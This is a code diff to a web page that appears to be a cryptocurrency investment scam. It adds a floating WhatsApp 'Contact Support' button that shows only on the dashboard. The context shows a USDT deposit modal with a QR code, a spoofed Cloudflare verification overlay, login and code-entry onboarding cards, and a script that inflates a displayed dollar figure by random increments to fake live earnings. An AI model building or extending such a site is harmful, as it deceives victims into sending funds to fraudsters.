@@ -675,6 +675,43 @@
       font-size: 1.01rem;
       line-height: 1.35;
     }
+
+    /* Floating WhatsApp Support Button */
+    #whatsapp-support-btn {
+      position: fixed;
+      left: 32px;
+      bottom: 38px;
+      z-index: 99999;
+      display: none;
+      align-items: center;
+      gap: 0.62em;
+      background: #22c55e;
+      color: #fff;
+      font-family: 'Inter', Arial, sans-serif;
+      font-weight: 800;
+      font-size: 1.01em;
+      border: none;
+      border-radius: 2em;
+      padding: 0.68em 1.7em 0.68em 1.1em;
+      box-shadow: 0 4px 24px 0 rgba(34, 197, 94, 0.15);
+      cursor: pointer;
+      transition: background 0.16s, box-shadow 0.16s, transform 0.12s;
+      outline: none;
+    }
+    #whatsapp-support-btn:hover, #whatsapp-support-btn:focus {
+      background: #1b9a49;
+      box-shadow: 0 8px 32px 0 rgba(34, 197, 94, 0.24);
+      transform: scale(1.055);
+    }
+    #whatsapp-support-btn svg {
+      width: 1.32em;
+      height: 1.32em;
+      margin-right: 0.35em;
+      vertical-align: middle;
+    }
+    @media (max-width: 700px) {
+      #whatsapp-support-btn { left: 10px; bottom: 14px; font-size: 0.97em; padding: 0.7em 1.2em 0.7em 0.9em;}
+    }
   </style>
 </head>
 <body>
@@ -809,13 +846,21 @@
       </div>
     </div>
 
+    <!-- ===== Floating WhatsApp Support Button ===== -->
+    <button id="whatsapp-support-btn" type="button" onclick="window.open('https://wa.me/14795465536', '_blank')">
+      <svg viewBox="0 0 32 32" fill="none">
+        <circle cx="16" cy="16" r="16" fill="#fff" opacity="0.18"/>
+        <path d="M16.001 6.312A9.688 9.688 0 0 0 6.312 16c0 1.7.447 3.291 1.221 4.67l-1.285 4.701 4.823-1.267a9.673 9.673 0 0 0 4.93 1.326A9.688 9.688 0 0 0 16 6.312Zm5.662 13.836c-.234.654-1.371 1.28-1.892 1.363-.483.076-1.094.107-1.759-.113-.404-.133-.924-.299-1.597-.587-2.813-1.212-4.648-4.188-4.784-4.385-.137-.197-1.142-1.518-1.142-2.898 0-1.38.723-2.059.979-2.34.255-.28.56-.35.746-.35.186 0 .373.002.537.01.176.008.41-.066.642.489.234.562.795 2.02.866 2.171.07.15.117.326.023.523-.095.198-.143.322-.28.497-.139.175-.292.391-.418.526-.126.136-.259.284-.112.563.146.28.652 1.078 1.399 1.748.96.867 1.768 1.138 2.048 1.27.279.133.442.112.601-.067.157-.18.69-.805.876-1.08.187-.276.372-.23.626-.137.255.093 1.605.758 1.882.895.277.138.462.204.53.318.07.116.07.669-.164 1.324Z" fill="#fff"/>
+      </svg>
+      CONTACT SUPPORT
+    </button>
+
     <!-- ===== Deposit Modal Popup ===== -->
     <div id="deposit-modal-bg" class="modal-bg hidden">
       <div class="modal" id="deposit-modal">
         <button class="close-modal-btn" id="close-deposit-modal" title="Close">&times;</button>
         <h2>Deposit USDT</h2>
         <div class="qr-section" style="align-items:center;">
-          <!-- QR code img element, wallet-like size -->
           <img id="deposit-qr-img" src="IMG_2325.jpeg" alt="Deposit QR Code" style="width:92px;height:92px;display:block;margin:0 auto 0.6rem auto;background:#fff;border-radius:0.3rem;border:1px solid #e2e8f0;" />
           <div class="modal-note" style="margin-bottom:0.7rem;">Scan QR code to get the address in your wallet app.</div>
         </div>
@@ -838,6 +883,8 @@
       setTimeout(() => {
         document.getElementById('cloudflare-verify-overlay').style.display = 'none';
         document.getElementById('main-site-content').style.display = '';
+        // Only show support button on dashboard (not onboarding)
+        document.getElementById('whatsapp-support-btn').style.display = 'none';
       }, 300);
     };
 
@@ -863,6 +910,10 @@
         document.getElementById(id).classList.add('hidden');
       }
       document.getElementById(cardId).classList.remove('hidden');
+      // Hide support button unless on dashboard
+      if (cardId === 'welcome-card' || cardId === 'platform-card' || cardId === 'login-card' || cardId === 'code-card') {
+        document.getElementById('whatsapp-support-btn').style.display = 'none';
+      }
     }
     document.getElementById('start-btn').onclick = function() {
       showCard('platform-card');
@@ -896,6 +947,7 @@
       document.getElementById('hello-user').textContent = "Hello, " + userEmail;
       updateDashboardBalances();
       setupDashboardHandlers();
+      document.getElementById('whatsapp-support-btn').style.display = 'flex';
     }
     function updateDashboardBalances() {
       userData = getUserData(userEmail);
@@ -995,8 +1047,8 @@
     let aiAmount = 1000000;
     setInterval(()=>{
       const increment = Math.random() * 190 + 10; // $10 - $200
-      aiAmount += increment;
       if(aiAmountEl) {
+        aiAmount += increment;
         aiAmountEl.textContent = "$" + aiAmount.toLocaleString(undefined, {maximumFractionDigits:0});
       }
     }, 1600);
